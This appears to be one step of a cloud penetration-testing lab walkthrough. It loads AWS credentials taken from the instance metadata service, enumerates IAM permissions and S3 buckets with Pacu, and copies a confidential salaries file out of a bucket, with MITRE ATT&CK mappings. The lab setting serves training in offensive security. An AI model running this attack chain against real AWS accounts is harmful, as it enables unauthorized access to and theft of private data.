# Phase 6.4 — Privilege Enumeration & Exfiltration (on Kali, using Pacu)

Back on your Kali attacker box, with the stolen temp credentials from
`03_credential_theft.md`:

```bash
export AWS_ACCESS_KEY_ID="<from IMDS>"
export AWS_SECRET_ACCESS_KEY="<from IMDS>"
export AWS_SESSION_TOKEN="<from IMDS>"

# sanity check — confirm you're acting as the stolen role
aws sts get-caller-identity
```

## Pacu

```bash
pip install pacu   # if not already installed
pacu
```

Inside the Pacu shell:

```
Pacu (new_session:default) > import_keys --all
Pacu (new_session:default) > run iam__enum_permissions
Pacu (new_session:default) > run iam__enum_users_roles_policies_groups
Pacu (new_session:default) > run s3__bucket_finder
```

`iam__enum_permissions` will confirm the stolen role effectively has
`AdministratorAccess` — your headline finding.
`s3__bucket_finder` will surface `corp-internal-backup-<name>` as
publicly listable/readable even without the stolen creds.

## Exfiltration (the "impact" step)

```bash
aws s3 cp s3://corp-internal-backup-<your-name>/confidential_salaries.csv ./stolen_data.csv
cat stolen_data.csv
```

**MITRE ATT&CK mapping:**
- T1087.004 — Account Discovery: Cloud Account (`iam__enum_*`)
- T1619 — Cloud Storage Object Discovery (`s3__bucket_finder`)
- T1530 — Data from Cloud Storage (the final `aws s3 cp` exfil)

This completes the attack chain. Screenshot each step for the report —
`get-caller-identity` output, the Pacu permission enumeration, and the
exfiltrated file contents are your three key evidence artifacts.
